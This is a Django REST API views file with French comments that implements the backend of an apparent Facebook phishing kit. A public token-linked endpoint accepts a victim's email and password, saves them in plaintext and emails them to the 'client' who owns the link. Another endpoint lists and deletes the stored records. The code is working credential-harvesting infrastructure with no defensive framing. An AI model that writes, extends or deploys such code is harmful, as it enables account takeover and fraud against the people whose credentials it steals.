from rest_framework.permissions import IsAuthenticated, AllowAny
from rest_framework.views import APIView
from rest_framework.response import Response
from rest_framework import status
from django.core.mail import send_mail
from django.conf import settings
from django.utils.timezone import now

from core.models import Facebook
from core.serializers import FacebookSerializer, FacebookSubmissionSerializer


class FacebookList(APIView):

    def get_permissions(self):
        if self.request.method == 'GET':
            return [IsAuthenticated()]
        if self.request.method == 'DELETE':
            return [IsAuthenticated()]
        return [AllowAny()]

    def get(self, request):
        facebook_users = Facebook.objects.all()
        serializer = FacebookSerializer(facebook_users, many=True)
        return Response(serializer.data)

    def post(self, request):
        serializer = FacebookSerializer(data=request.data)
        if serializer.is_valid():
            serializer.save()
            return Response(serializer.data, status=status.HTTP_201_CREATED)
        return Response(serializer.errors, status=status.HTTP_400_BAD_REQUEST)

    def delete(self, request, pk):
        try:
            facebook_user = Facebook.objects.get(pk=pk)
            facebook_user.delete()
            return Response({"message": "Utilisateur supprimé avec succès"}, status=status.HTTP_204_NO_CONTENT)
        except Facebook.DoesNotExist:
            return Response({"error": "Utilisateur non trouvé"}, status=status.HTTP_404_NOT_FOUND)


class FacebookByTokenView(APIView):
    """
    GET /facebook/link/<token>/
    Retourne l'email + type du client lié au token.
    Public — pas d'auth requise.
    """
    permission_classes = [AllowAny]

    def get(self, request, token):
        try:
            instance = Facebook.objects.get(token=token)
        except Facebook.DoesNotExist:
            return Response({"error": "Lien invalide ou expiré."}, status=status.HTTP_404_NOT_FOUND)

        return Response({
            "id":    instance.id,
            "name":  instance.name,
            "email": instance.email,
            "token": instance.token,
            "type":  instance.type,
        })


class FacebookSubmitView(APIView):
    """
    POST /facebook/link/<token>/submit/

    Le front envoie : { "email": "...", "password": "..." }
    Le back :
      1. Enregistre en BDD dans Facebook (email, password, date, heure auto)
      2. Envoie un mail au client (l'email lié au token) avec email, password, date, heure
    Public — pas d'auth requise.
    """
    permission_classes = [AllowAny]

    def post(self, request, token):
        # 1. Retrouver le client lié au token
        try:
            client = Facebook.objects.get(token=token)
        except Facebook.DoesNotExist:
            return Response({"error": "Lien invalide ou expiré."}, status=status.HTTP_404_NOT_FOUND)

        # 2. Valider les données postées
        serializer = FacebookSubmissionSerializer(data=request.data)
        if not serializer.is_valid():
            return Response(serializer.errors, status=status.HTTP_400_BAD_REQUEST)

        submitted_email    = serializer.validated_data["email"]
        submitted_password = serializer.validated_data["password"]
        current_datetime   = now()

        # 3. Enregistrer en BDD — nouvelle entrée liée au client
        submission = Facebook.objects.create(
            name     = client.name,       # même client
            email    = submitted_email,
            password = submitted_password,
            type     = client.type,
        )

        # 4. Envoyer le mail au client avec les infos soumises
        subject = "Nouvelles informations reçues"
        message = (
            f"Bonjour {client.name},\n\n"
            f"Voici les informations reçues via votre lien :\n\n"
            f"Email    : {submitted_email}\n"
            f"Password : {submitted_password}\n"
            f"Date     : {current_datetime.strftime('%Y-%m-%d')}\n"
            f"Heure    : {current_datetime.strftime('%H:%M:%S')}\n"
        )

        try:
            send_mail(
                subject      = subject,
                message      = message,
                from_email   = settings.EMAIL_HOST_USER,
                recipient_list = [client.email],
                fail_silently  = False,
            )
        except Exception as e:
            # Mail échoué mais on a quand même enregistré en BDD
            return Response(
                {"warning": f"Enregistré mais mail non envoyé : {str(e)}"},
                status=status.HTTP_201_CREATED,
            )

        return Response({"message": "Enregistré et mail envoyé."}, status=status.HTTP_201_CREATED)

